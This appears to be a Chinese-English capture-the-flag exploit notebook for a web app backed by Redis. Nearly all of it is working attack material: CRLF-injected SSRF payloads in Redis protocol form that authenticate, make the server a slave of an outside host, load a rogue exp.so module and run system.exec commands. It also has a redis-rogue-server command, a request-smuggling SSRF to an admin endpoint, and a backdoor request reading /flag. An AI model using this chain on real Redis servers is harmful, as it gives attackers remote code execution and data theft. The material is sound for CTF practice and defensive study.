

python3.6 redis-rogue-server.py  --rhost 127.0.0.1 --rport 6379 --lhost  vps

<!-- socat -v tcp-listen:7777,fork tcp-connect:127.0.0.1:6379 -->

<!-- {"notes":[{"Type":"urlnote","Data":{"title":"172.18.2:6379","url":"123435"}}]} -->


type Adminnote struct {
	Version string  // cat /etc/issue 
	Who string  // who login system
	Memory string //   cat /proc/meminfo
}

### payload记录


#### auth 

*2\r
$4\r
auth\r
$13\r
redis123456aB\r

*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a

#### CONFIG SET dbfilename exp.so


*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$6\r
exp.so\r


*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a

#### slaveof wonderkun.cc 21000

*3\r
$7\r
SLAVEOF\r
$12\r
wonderkun.cc\r
$5\r
21000\r

*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$12%0d%0awonderkun.cc%0d%0a$5%0d%0a21000%0d%0a

#### MODULE LOAD ./exp.so


*3\r
$6\r
MODULE\r
$4\r
LOAD\r
$8\r
./exp.so\r

*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a

#### SLAVEOF NO ONE

*3\r
$7\r
SLAVEOF\r
$2\r
NO\r
$3\r
ONE\r


*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a

#### system.exec "ls"

*2\r
$11\r
system.exec\r
$2\r
ls\r

*2%0d%0a$11%0d%0asystem.exec%0d%0a$2%0d%0als%0d%0a

### 第一步: 

添加urlnote, 设置slave模式

title=172.18.2:6379&url=http://172.25.0.3:6379/?a=1%0d%0a

*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a
*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a
*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$12%0d%0awonderkun.cc%0d%0a$5%0d%0a21000%0d%0a


### 第二步: 

添加urlnote，实现延时 

title=172.18.2:6379&url=http://127.0.0.100:6379/?a=test

可以插入多条，保证slave 模式可以更新

### 第三步

添加urlnote，实现加载模块,同时删除自己的slave 模式。

title=172.18.2:6379&url=http://172.25.0.3:6379/?a=1%0d%0a

*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a

*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a

*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a
*2%0d%0a$11%0d%0asystem.exec%0d%0a$2%0d%0als%0d%0a


### 第四步

set key '{"notes":[{"Type":"adminnote","Data":{"version":"172.18.2:6379","who":"wonderkun","memory":"cat /flag"}}]}'

读取flag。


#### bug1 

ssrf 

```
POST /urlnote HTTP/1.1
Host: 192.168.15.166
Content-Length: 241
Pragma: no-cache
Cache-Control: no-cache
Origin: http://192.168.15.166
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.15.166/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,pl;q=0.6,zh-TW;q=0.5,pt;q=0.4,de;q=0.3
Connection: close

title=test&url=http://127.0.0.1:81/test2?a=1%20HTTP/1.1%0d%0aHost:%20127.0.0.1:81%0d%0aConnection:%20keep-alive%0d%0aContent-Length:%200%0d%0a%0d%0aPOST%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1:81%0d%0aIdentify-Client:%20123456%0d%0a%0d%0a
```

flag in file assets/e10adc3949ba59abbe56e057f20f883e ，read /static/e10adc3949ba59abbe56e057f20f883e from http requests。

#### backdoor 

```
GET /info?file=/flag HTTP/1.1
Host: 192.168.15.166
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; wdeYKQtOhc6L8TsIm1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,pl;q=0.6,zh-TW;q=0.5,pt;q=0.4,de;q=0.3
Connection: close


```


